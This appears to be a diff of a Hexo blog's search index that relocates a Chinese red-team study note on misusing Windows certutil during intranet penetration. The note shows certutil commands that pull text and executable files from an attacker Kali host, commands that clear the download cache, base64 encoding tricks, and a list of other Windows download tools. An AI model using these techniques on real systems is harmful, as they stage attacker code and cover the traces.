@@ -426,104 +426,6 @@
       </tags>
   </entry>
   <entry>
-    <title>【内网渗透学习笔记】02、内网渗透中的certutil</title>
-    <url>/2021/04/01/intranet02/</url>
-    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Windows中的内置程序Certutil.exe ，作为证书服务的一部分进行安装。使用此程序可以在Windows中安装、备份、删除、管理以及执行证书相关的各种功能。</p>
-<p><strong>Certutil可以从远程<code>URL</code>下载证书或任何其它文件。</strong></p>
-<h2 id="下载的常用方法"><a href="#下载的常用方法" class="headerlink" title="下载的常用方法"></a>下载的常用方法</h2><ul>
-<li>背景</li>
-</ul>
-<p>kali（IP：10.7.7.7）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span>		<span class="comment">##python3</span></span><br><span class="line">python -m SimpleHTTPServer <span class="number">80</span>		<span class="comment">##python2</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><ol>
-<li>保存在当前路径，文件名称同URL</li>
-</ol>
-</li>
-</ul>
-<p><code>example</code>:</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401151204777.png" alt="image-20210401151204777"></p>
-<ul>
-<li>2)保存在当前路径，指定文件名称保存</li>
-</ul>
-<p><code>example</code>:</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt  a.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401151741297.png" alt="image-20210401151741297"></p>
-<ul>
-<li>3)保存在缓存目录，名称随机</li>
-</ul>
-<p>缓存目录位置：</p>
-<p><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
-<p><code>example</code>:</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401152512141.png" alt="image-20210401152512141"></p>
-<ul>
-<li>4)支持保存二进制文件</li>
-</ul>
-<p><code>example</code>:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.7.7.7&#x2F;test.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401152823463.png" alt="image-20210401152823463"></p>
-<h2 id="清除下载文件"><a href="#清除下载文件" class="headerlink" title="清除下载文件"></a>清除下载文件</h2><ul>
-<li>查看缓存项目</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache *</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>删除缓存项目</li>
-</ul>
-<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">certutil -urlcache * <span class="keyword">delete</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="base64编码转换"><a href="#base64编码转换" class="headerlink" title="base64编码转换"></a>base64编码转换</h2><ul>
-<li>1）base64编码：</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutill -encode InFile Outfile</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401163137364.png" alt="image-20210401163137364"></p>
-<p>编码后的文件会添加两处标识信息：</p>
-<p>文件头：</p>
-<p><code>----BEGIN CERTIFICATE-----</code></p>
-<p>文件尾：</p>
-<p><code>-----END CERTIFICATE-----</code></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401163309621.png" alt="image-20210401163309621"></p>
-<ul>
-<li>2)base64解密</li>
-</ul>
-<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">certutil -<span class="keyword">decode</span> <span class="keyword">InFile</span> <span class="keyword">OutFile</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>主要总结了certutil的几种下载方法，并且介绍了base64编码转换的常用方法。</p>
-<p><code>Windows</code>常见的几种下载拓展：</p>
-<ul>
-<li>bitsadmin</li>
-<li>powershell</li>
-<li>mshta</li>
-<li>regsvr32</li>
-<li>csc</li>
-<li>vbs</li>
-<li>wget</li>
-<li>ftp</li>
-<li>debug</li>
-<li>tftp</li>
-</ul>
-]]></content>
-      <categories>
-        <category>内网学习笔记</category>
-      </categories>
-      <tags>
-        <tag>红队</tag>
-        <tag>certutil</tag>
-        <tag>学习笔记</tag>
-        <tag>内网渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【内网渗透学习笔记】01、端口探测</title>
     <url>/2021/04/01/intranet01/</url>
     <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>端口探测在渗透测试中信息收集以及威胁情报领域都有着很重要的应用</strong></p>
@@ -782,9 +684,107 @@
       </categories>
       <tags>
         <tag>红队</tag>
+        <tag>端口探测</tag>
         <tag>学习笔记</tag>
         <tag>内网渗透</tag>
-        <tag>端口探测</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【内网渗透学习笔记】02、内网渗透中的certutil</title>
+    <url>/2021/04/01/intranet02/</url>
+    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Windows中的内置程序Certutil.exe ，作为证书服务的一部分进行安装。使用此程序可以在Windows中安装、备份、删除、管理以及执行证书相关的各种功能。</p>
+<p><strong>Certutil可以从远程<code>URL</code>下载证书或任何其它文件。</strong></p>
+<h2 id="下载的常用方法"><a href="#下载的常用方法" class="headerlink" title="下载的常用方法"></a>下载的常用方法</h2><ul>
+<li>背景</li>
+</ul>
+<p>kali（IP：10.7.7.7）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span>		<span class="comment">##python3</span></span><br><span class="line">python -m SimpleHTTPServer <span class="number">80</span>		<span class="comment">##python2</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><ol>
+<li>保存在当前路径，文件名称同URL</li>
+</ol>
+</li>
+</ul>
+<p><code>example</code>:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401151204777.png" alt="image-20210401151204777"></p>
+<ul>
+<li>2)保存在当前路径，指定文件名称保存</li>
+</ul>
+<p><code>example</code>:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt  a.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401151741297.png" alt="image-20210401151741297"></p>
+<ul>
+<li>3)保存在缓存目录，名称随机</li>
+</ul>
+<p>缓存目录位置：</p>
+<p><code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
+<p><code>example</code>:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -f http://<span class="number">10</span>.<span class="number">7</span>.<span class="number">7</span>.<span class="number">7</span>/test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401152512141.png" alt="image-20210401152512141"></p>
+<ul>
+<li>4)支持保存二进制文件</li>
+</ul>
+<p><code>example</code>:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;10.7.7.7&#x2F;test.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401152823463.png" alt="image-20210401152823463"></p>
+<h2 id="清除下载文件"><a href="#清除下载文件" class="headerlink" title="清除下载文件"></a>清除下载文件</h2><ul>
+<li>查看缓存项目</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutil -urlcache *</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>删除缓存项目</li>
+</ul>
+<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">certutil -urlcache * <span class="keyword">delete</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="base64编码转换"><a href="#base64编码转换" class="headerlink" title="base64编码转换"></a>base64编码转换</h2><ul>
+<li>1）base64编码：</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">certutill -encode InFile Outfile</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401163137364.png" alt="image-20210401163137364"></p>
+<p>编码后的文件会添加两处标识信息：</p>
+<p>文件头：</p>
+<p><code>----BEGIN CERTIFICATE-----</code></p>
+<p>文件尾：</p>
+<p><code>-----END CERTIFICATE-----</code></p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210401163309621.png" alt="image-20210401163309621"></p>
+<ul>
+<li>2)base64解密</li>
+</ul>
+<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">certutil -<span class="keyword">decode</span> <span class="keyword">InFile</span> <span class="keyword">OutFile</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>主要总结了certutil的几种下载方法，并且介绍了base64编码转换的常用方法。</p>
+<p><code>Windows</code>常见的几种下载拓展：</p>
+<ul>
+<li>bitsadmin</li>
+<li>powershell</li>
+<li>mshta</li>
+<li>regsvr32</li>
+<li>csc</li>
+<li>vbs</li>
+<li>wget</li>
+<li>ftp</li>
+<li>debug</li>
+<li>tftp</li>
+</ul>
+]]></content>
+      <categories>
+        <category>内网学习笔记</category>
+      </categories>
+      <tags>
+        <tag>红队</tag>
+        <tag>学习笔记</tag>
+        <tag>内网渗透</tag>
+        <tag>certutil</tag>
       </tags>
   </entry>
   <entry>
